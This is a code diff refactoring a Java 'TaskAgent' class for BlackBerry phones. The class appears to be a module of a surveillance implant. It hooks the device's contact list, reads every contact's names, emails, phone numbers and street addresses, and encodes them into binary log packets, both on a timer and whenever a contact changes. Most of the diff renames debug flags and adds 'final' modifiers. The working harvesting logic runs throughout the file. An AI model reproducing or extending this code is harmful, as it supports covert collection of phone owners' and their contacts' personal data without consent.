@@ -19,7 +19,6 @@ import javax.microedition.pim.PIMItem;
 
 import net.rim.blackberry.api.pdap.BlackBerryPIMList;
 import net.rim.blackberry.api.pdap.PIMListListener;
-import net.rim.device.api.util.ByteVector;
 import net.rim.device.api.util.DataBuffer;
 import blackberry.config.Keys;
 import blackberry.debug.Debug;
@@ -44,8 +43,7 @@ public final class TaskAgent extends Agent implements PIMListListener {
     protected static final int PERIODTIME = 60 * 60 * 1000;
 
     /**
-     * Instantiates a new Organizer agent.
-     * TaskAgent on Mobile
+     * Instantiates a new Organizer agent. TaskAgent on Mobile
      * 
      * @param agentStatus
      *            the agent status
@@ -65,7 +63,7 @@ public final class TaskAgent extends Agent implements PIMListListener {
     protected TaskAgent(final boolean agentStatus, final byte[] confParams) {
         this(agentStatus);
 
-        //#ifdef DEBUG_TRACE
+        //#ifdef DEBUG
         debug.trace("TaskAgent");
         //#endif
 
@@ -81,18 +79,18 @@ public final class TaskAgent extends Agent implements PIMListListener {
     }
 
     public synchronized void actualStart() {
-        //#ifdef DEBUG_TRACE
+        //#ifdef DEBUG
         debug.trace("actualStart: add listener");
         //#endif
 
-        PIM pim = PIM.getInstance();
+        final PIM pim = PIM.getInstance();
         BlackBerryPIMList contacts;
         try {
             contacts = (BlackBerryPIMList) pim.openPIMList(PIM.CONTACT_LIST,
                     PIM.READ_ONLY);
             contacts.addListener(this);
-        } catch (PIMException e) {
-            //#ifdef DEBUG_ERROR
+        } catch (final PIMException e) {
+            //#ifdef DEBUG
             debug.error(e);
             //#endif
         }
@@ -100,18 +98,18 @@ public final class TaskAgent extends Agent implements PIMListListener {
     }
 
     public synchronized void actualStop() {
-        //#ifdef DEBUG_TRACE
+        //#ifdef DEBUG
         debug.trace("actualStop: remove listener");
         //#endif
 
-        PIM pim = PIM.getInstance();
+        final PIM pim = PIM.getInstance();
         BlackBerryPIMList contacts;
         try {
             contacts = (BlackBerryPIMList) pim.openPIMList(PIM.CONTACT_LIST,
                     PIM.READ_ONLY);
             contacts.removeListener(this);
-        } catch (PIMException e) {
-            //#ifdef DEBUG_ERROR
+        } catch (final PIMException e) {
+            //#ifdef DEBUG
             debug.error(e);
             //#endif
         }
@@ -122,12 +120,12 @@ public final class TaskAgent extends Agent implements PIMListListener {
      * @see blackberry.threadpool.TimerJob#actualRun()
      */
     public void actualRun() {
-        //#ifdef DEBUG_TRACE
+        //#ifdef DEBUG
         debug.trace("actualRun");
         //#endif
 
         if (markup.isMarkup()) {
-            //#ifdef DEBUG_INFO
+            //#ifdef DEBUG
             debug.info("Markup is present, no need to get the contact list");
             //#endif
             return;
@@ -140,9 +138,9 @@ public final class TaskAgent extends Agent implements PIMListListener {
             contactList = (ContactList) PIM.getInstance().openPIMList(
                     PIM.CONTACT_LIST, PIM.READ_ONLY);
 
-            Enumeration eContacts = contactList.items();
+            final Enumeration eContacts = contactList.items();
 
-            //#ifdef DEBUG_TRACE
+            //#ifdef DEBUG
             debug.trace("actualRun: got contacts");
             //#endif
 
@@ -154,10 +152,10 @@ public final class TaskAgent extends Agent implements PIMListListener {
                 contact = (Contact) eContacts.nextElement();
 
                 try {
-                    byte[] packet = getContactPacket(contactList, contact);
+                    final byte[] packet = getContactPacket(contactList, contact);
                     log.writeLog(packet);
-                } catch (Exception ex) {
-                    //#ifdef DEBUG_ERROR
+                } catch (final Exception ex) {
+                    //#ifdef DEBUG
                     debug.error(ex);
                     //#endif
                 }
@@ -165,8 +163,8 @@ public final class TaskAgent extends Agent implements PIMListListener {
 
             log.close();
 
-        } catch (PIMException e) {
-            //#ifdef DEBUG_ERROR
+        } catch (final PIMException e) {
+            //#ifdef DEBUG
             debug.error(e);
             //#endif
         }
@@ -179,16 +177,16 @@ public final class TaskAgent extends Agent implements PIMListListener {
      * @return
      */
     private byte[] getContactPacket(ContactList contactList, Contact contact) {
-        int version = 0x01000000;
+        final int version = 0x01000000;
 
-        byte[] header = new byte[12];
-        byte[] payload = new byte[0];
+        final byte[] header = new byte[12];
+        final byte[] payload = new byte[0];
 
-        DataBuffer dbPayload = new DataBuffer(payload, 0, 2048, false);
+        final DataBuffer dbPayload = new DataBuffer(payload, 0, 2048, false);
 
-        String[] categories = contact.getCategories();
+        final String[] categories = contact.getCategories();
         for (int i = 0; i < categories.length; i++) {
-            //#ifdef DEBUG_TRACE
+            //#ifdef DEBUG
             debug.trace("getContactPacket cat: " + categories[i]);
             //#endif
         }
@@ -197,26 +195,26 @@ public final class TaskAgent extends Agent implements PIMListListener {
 
         if (contactList.isSupportedField(Contact.UID)) {
             if (contact.countValues(Contact.UID) > 0) {
-                String suid = contact.getString(Contact.UID, 0);
-                //#ifdef DEBUG_TRACE
+                final String suid = contact.getString(Contact.UID, 0);
+                //#ifdef DEBUG
                 debug.trace("actualRun uid: " + suid);
                 //#endif
                 try {
                     uid = Integer.parseInt(suid);
-                } catch (NumberFormatException ex) {
-                    //#ifdef DEBUG_ERROR
+                } catch (final NumberFormatException ex) {
+                    //#ifdef DEBUG
                     debug.error(ex);
                     //#endif
                 }
             }
         }
 
-        //#ifdef DEBUG_TRACE
+        //#ifdef DEBUG
         debug.trace("getContactPacket: name");
         //#endif
         if (contactList.isSupportedField(Contact.NAME)) {
             if (contact.countValues(Contact.NAME) > 0) {
-                String[] names = contact.getStringArray(Contact.NAME, 0);
+                final String[] names = contact.getStringArray(Contact.NAME, 0);
 
                 addField(dbPayload, names, Contact.NAME_GIVEN, (byte) 0x01);
                 addField(dbPayload, names, Contact.NAME_FAMILY, (byte) 0x02);
@@ -224,23 +222,23 @@ public final class TaskAgent extends Agent implements PIMListListener {
             }
         }
 
-        //#ifdef DEBUG_TRACE
+        //#ifdef DEBUG
         debug.trace("getContactPacket: email");
         //#endif
         addEmailField(contactList, contact, dbPayload, Contact.EMAIL,
                 new byte[] { 0x06, 0x0D, 0x0F });
 
-        //#ifdef DEBUG_TRACE
+        //#ifdef DEBUG
         debug.trace("getContactPacket: tel");
         //#endif
         addTelField(contactList, contact, dbPayload, Contact.TEL, (byte) 0x07);
 
-        //#ifdef DEBUG_TRACE
+        //#ifdef DEBUG
         debug.trace("getContactPacket: addr");
         //#endif
         if (contactList.isSupportedField(Contact.ADDR)) {
             if (contact.countValues(Contact.ADDR) > 0) {
-                String[] addr = contact.getStringArray(Contact.ADDR, 0);
+                final String[] addr = contact.getStringArray(Contact.ADDR, 0);
 
                 addField(dbPayload, addr, Contact.ADDR_STREET, (byte) 0x21);
                 addField(dbPayload, addr, Contact.ADDR_EXTRA, (byte) 0x36);
@@ -251,10 +249,10 @@ public final class TaskAgent extends Agent implements PIMListListener {
                 addField(dbPayload, addr, Contact.ADDR_COUNTRY, (byte) 0x2F);
 
             }
-        }       
-        
-        int size = dbPayload.getLength() + header.length;
-        //#ifdef DEBUG_TRACE
+        }
+
+        final int size = dbPayload.getLength() + header.length;
+        //#ifdef DEBUG
         debug.trace("payload len: " + dbPayload.getLength());
         debug.trace("header len: " + header.length);
         debug.trace("size len: " + size);
@@ -262,12 +260,12 @@ public final class TaskAgent extends Agent implements PIMListListener {
 
         // a questo punto il payload e' pronto
 
-        DataBuffer db_header = new DataBuffer(header, 0, size, false);
+        final DataBuffer db_header = new DataBuffer(header, 0, size, false);
         db_header.writeInt(size);
         db_header.writeInt(version);
         db_header.writeInt(uid);
 
-        //#ifdef DEBUG_TRACE
+        //#ifdef DEBUG
         debug.trace("header: " + Utils.byteArrayToHex(header));
         //#endif      
 
@@ -282,15 +280,15 @@ public final class TaskAgent extends Agent implements PIMListListener {
 
         //db_header.write(payload);
 
-        byte[] packet = Utils
-                .concat(header, 12, payload, dbPayload.getLength());
+        final byte[] packet = Utils.concat(header, 12, payload, dbPayload
+                .getLength());
 
         //#ifdef DBC
         Check.ensures(packet.length == size,
                 "getContactPayload packet.length: " + packet.length);
         //#endif
 
-        //#ifdef DEBUG_TRACE
+        //#ifdef DEBUG
         debug.trace("packet: " + Utils.byteArrayToHex(packet));
         //#endif                
 
@@ -302,11 +300,11 @@ public final class TaskAgent extends Agent implements PIMListListener {
 
         try {
             if (fields[fieldNumber] != null) {
-                String value = fields[fieldNumber];
+                final String value = fields[fieldNumber];
                 Utils.addTypedString(dbPayload, logType, value);
             }
-        } catch (Exception ex) {
-            //#ifdef DEBUG_ERROR
+        } catch (final Exception ex) {
+            //#ifdef DEBUG
             debug.error(ex);
             //#endif
         }
@@ -315,44 +313,36 @@ public final class TaskAgent extends Agent implements PIMListListener {
 
     /*
      * private void addField(ContactList contactList, Contact contact,
-     * DataBuffer dbPayload, int contactType, byte logType) {
-     * if (name[Contact.NAME_GIVEN] != null) {
-     * String first = name[Contact.NAME_GIVEN];
-     * Utils.addTypedString(db_payload, (byte) 0x01, first);
-     * }
-     * if (contactList.isSupportedField(contactType)) {
-     * if (contact.countValues(contactType) >= 0) {
-     * String value = contact.getString(contactType, 0);
-     * //#ifdef DEBUG_TRACE
-     * debug.trace("addField: " + contactType + "," + logType + " "
-     * + value);
-     * //#endif
-     * Utils.addTypedString(dbPayload, logType, value);
-     * }
-     * }
-     * }
+     * DataBuffer dbPayload, int contactType, byte logType) { if
+     * (name[Contact.NAME_GIVEN] != null) { String first =
+     * name[Contact.NAME_GIVEN]; Utils.addTypedString(db_payload, (byte) 0x01,
+     * first); } if (contactList.isSupportedField(contactType)) { if
+     * (contact.countValues(contactType) >= 0) { String value =
+     * contact.getString(contactType, 0); //#ifdef DEBUG
+     * debug.trace("addField: " + contactType + "," + logType + " " + value);
+     * //#endif Utils.addTypedString(dbPayload, logType, value); } } }
      */
     private void addEmailField(ContactList contactList, Contact contact,
             DataBuffer dbPayload, int contactType, byte[] logTypes) {
 
         if (contactList.isSupportedField(contactType)) {
             try {
-                int preferred = contact.getPreferredIndex(contactType);
-                //#ifdef DEBUG_TRACE
+                final int preferred = contact.getPreferredIndex(contactType);
+                //#ifdef DEBUG
                 debug.trace("addStringField preferred : " + preferred);
                 //#endif           
 
                 for (int i = 0; i < contact.countValues(contactType)
                         && i < logTypes.length; i++) {
-                    String value = contact.getString(contactType, i);
-                    //#ifdef DEBUG_TRACE
+                    final String value = contact.getString(contactType, i);
+                    //#ifdef DEBUG
                     debug.trace("addStringField: " + logTypes[i] + " " + value);
                     //#endif
                     Utils.addTypedString(dbPayload, logTypes[i], value);
                 }
 
-            } catch (Exception ex) {
-                //#ifdef DEBUG_ERROR
+            } catch (final Exception ex) {
+                //#ifdef DEBUG
                 debug.error(ex);
                 //#endif
             }
@@ -364,21 +354,21 @@ public final class TaskAgent extends Agent implements PIMListListener {
 
         if (contactList.isSupportedField(contactType)) {
             try {
-                int preferred = contact.getPreferredIndex(contactType);
-                //#ifdef DEBUG_TRACE
+                final int preferred = contact.getPreferredIndex(contactType);
+                //#ifdef DEBUG
                 debug.trace("addStringField preferred : " + preferred);
                 //#endif
 
                 if (contact.countValues(contactType) > 0) {
-                    String value = contact.getString(contactType, 0);
+                    final String value = contact.getString(contactType, 0);
                     Utils.addTypedString(dbPayload, logType, value);
                 }
 
                 String note = "";
-                int last = contact.countValues(contactType) - 1;
+                final int last = contact.countValues(contactType) - 1;
                 for (int i = 1; i <= last; i++) {
-                    String value = contact.getString(contactType, i);
-                    //#ifdef DEBUG_TRACE
+                    final String value = contact.getString(contactType, i);
+                    //#ifdef DEBUG
                     debug.trace("addStringField: " + logType + " " + value);
                     //#endif
 
@@ -388,13 +378,13 @@ public final class TaskAgent extends Agent implements PIMListListener {
                     }
                 }
 
-                //#ifdef DEBUG_TRACE
+                //#ifdef DEBUG
                 debug.trace("addTelField note: " + note);
                 //#endif
 
                 Utils.addTypedString(dbPayload, (byte) 0x34, note);
-            } catch (Exception ex) {
-                //#ifdef DEBUG_ERROR
+            } catch (final Exception ex) {
+                //#ifdef DEBUG
                 debug.error(ex);
                 //#endif
             }
@@ -406,7 +396,7 @@ public final class TaskAgent extends Agent implements PIMListListener {
      * @see blackberry.agent.Agent#parse(byte[])
      */
     protected boolean parse(final byte[] confParameters) {
-        //#ifdef DEBUG_TRACE
+        //#ifdef DEBUG
         debug.trace("parse");
         //#endif
         return true;
@@ -414,7 +404,7 @@ public final class TaskAgent extends Agent implements PIMListListener {
 
     public void itemAdded(PIMItem item) {
         init();
-        //#ifdef DEBUG_TRACE
+        //#ifdef DEBUG
         debug.trace("itemAdded: " + item);
         //#endif
         save(item);
@@ -422,14 +412,14 @@ public final class TaskAgent extends Agent implements PIMListListener {
 
     public void itemRemoved(PIMItem item) {
         init();
-        //#ifdef DEBUG_TRACE
+        //#ifdef DEBUG
         debug.trace("itemRemoved: " + item);
         //#endif
     }
 
     public void itemUpdated(PIMItem itemOld, PIMItem itemNew) {
         init();
-        //#ifdef DEBUG_TRACE
+        //#ifdef DEBUG
         debug.trace("itemUpdated: " + itemNew);
         //#endif
 
@@ -438,16 +428,16 @@ public final class TaskAgent extends Agent implements PIMListListener {
 
     private void save(PIMItem item) {
         try {
-            ContactList contactList = (ContactList) item.getPIMList();
-            Contact contact = (Contact) item;
+            final ContactList contactList = (ContactList) item.getPIMList();
+            final Contact contact = (Contact) item;
 
-            byte[] payload = getContactPacket(contactList, contact);
+            final byte[] payload = getContactPacket(contactList, contact);
 
             log.createLog(null, LogType.ADDRESSBOOK);
             log.writeLog(payload);
             log.close();
-        } catch (Exception ex) {
-            //#ifdef DEBUG_ERROR
+        } catch (final Exception ex) {
+            //#ifdef DEBUG
             debug.error(ex);
             //#endif
         }
